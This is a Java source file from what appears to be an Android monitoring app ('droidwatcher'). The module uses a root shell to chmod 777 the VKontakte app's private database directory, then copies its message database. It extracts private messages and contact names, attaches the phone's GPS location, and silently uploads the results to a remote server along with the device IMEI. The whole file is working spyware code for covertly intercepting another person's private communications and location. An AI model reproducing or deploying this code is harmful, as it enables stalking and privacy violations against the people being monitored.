package com.droidwatcher.modules.vk;

import java.util.ArrayList;
import java.util.Date;

import org.acra.ACRA;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.preference.PreferenceManager;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.IMMessage;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.variables.ServerMessage;
import com.stericson.RootTools.RootTools;

@SuppressLint("SdCardPath")
public class VkModule_v3 extends VkModuleBase {
	private static final String PATH_VK = "/data/data/com.vkontakte.android/databases/vk.db";
	private static final String[] FRIENDS_COLUMNS = new String[] {"firstname", "lastname"};
	private static final String[] MESSAGES_COLUMNS = new String[] {"peer", "sender", "text", "time"};
	
	private String LOCAL_PATH_VK = "";
	
	public VkModule_v3(Context context) {
		super(context);
		
		LOCAL_PATH_VK = FileUtil.getFullPath(context, "vk.db");
	}
	
	@Override
	public synchronized void start() {
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.vkontakte.android/databases/*",
				"chmod 777 /data/data/com.vkontakte.android/databases",
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));
			
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				FileUtil.copyFile(PATH_VK, LOCAL_PATH_VK);
				
				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, getLastUpdate());
				mFileObserver = new VkFileObserver(PATH_VK);
				
				Debug.i("[VkModule_v3] Start watching");
				mFileObserver.startWatching();
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}

	@Override
	public synchronized void stop() {
		try {
			saveLastMsgTimestamp(mLastMsgTimestamp);
			mFileObserver.stopWatching();
			mFileObserver = null;
			
		} catch (Exception e) {
			Debug.exception(e);
			
		} finally {
			mFileObserver = null;
		}
	}
	
	@Override
	protected synchronized void getNewChat(){
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.vkontakte.android/databases/*",
				"chmod 777 /data/data/com.vkontakte.android/databases");
		
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				_getNewChat();
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}

	protected synchronized void _getNewChat(){
		if (!FileUtil.copyFile(PATH_VK, LOCAL_PATH_VK)) {
			return;
		}
		
		SQLiteDatabase db = null;
		
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_VK, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			ArrayList<IMessageBody> list = getMessages(db);
			
			if (list == null) {
				return;
			}
			
			final long lastMsgTimestamp = mLastMsgTimestamp;
			mLastMsgTimestamp = getLastMsgTimestamp(db);
			
			db.close();
			db = null;
			
			if (list != null && list.size() > 0 && networkAvailable()) {
				new ServerMessanger(
					mContext,
					new ServerMessage(MessageType.VK, mSettings.imei(), mSettings.login(), list),
					new ServerMessanger.ICallBack() {
						@Override
						public boolean onFinished(String response) { return false; }

						@Override
						public void onError() {
							mLastMsgTimestamp = lastMsgTimestamp;
						}

						@Override
						public void onSuccess() {
							saveLastMsgTimestamp(mLastMsgTimestamp);
						}
					}
				).start();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
		}
	}
	
	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			IMMessage message;
			long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
			c = db.query("messages", MESSAGES_COLUMNS, "time > " + mLastMsgTimestamp, null, null, null, null);
			while (c.moveToNext()) {
				int peer = c.getInt(0);
				int sender = c.getInt(1);
				String text = c.getString(2);
				long date = c.getLong(3) * 1000; /* time */
				
				message = new IMMessage(date, text, getUserName(db, peer), sender == peer ? 1 : 2);
				
				if (date >= timeout) {
					Location location = LocationModule.getLocation(mContext);
					if (location != null) {
						message.addLocation(location.getLatitude(), location.getLongitude());
					}
				}
				
				messages.add(message);
			}
			
			return messages;
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return null;
			
		} finally {
			if (c != null) {
				c.close();
			}
		}
	}
	
	private synchronized String getUserName(SQLiteDatabase db, int uid){
		if (mUsernames.get(uid) != null) {
			return mUsernames.get(uid);
		}
		
		Cursor c = null;
		try {
			c = db.query("users",  FRIENDS_COLUMNS, "uid = ?", new String[] { String.valueOf(uid) }, null, null, null);
			if (c.getCount() != 1) {
				return "Unknown";
			}
			
			if (c.moveToFirst()) {
				String username = c.getString(0) + " " + c.getString(1);
				mUsernames.put(uid, username);
				return username;
			}
			
			mUsernames.put(uid, "Unknown");
			return "Unknown";
			
		} catch(Exception e){
			e.printStackTrace();
			return "Unknown";
			
		} finally {			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastUpdate(){
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_VK, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(time) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastMsgTimestamp(SQLiteDatabase db){
		Cursor c = null;
		try {
			c = db.rawQuery("SELECT MAX(time) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {			
			if (c != null) {
				c.close();
			}
		}
	}
}
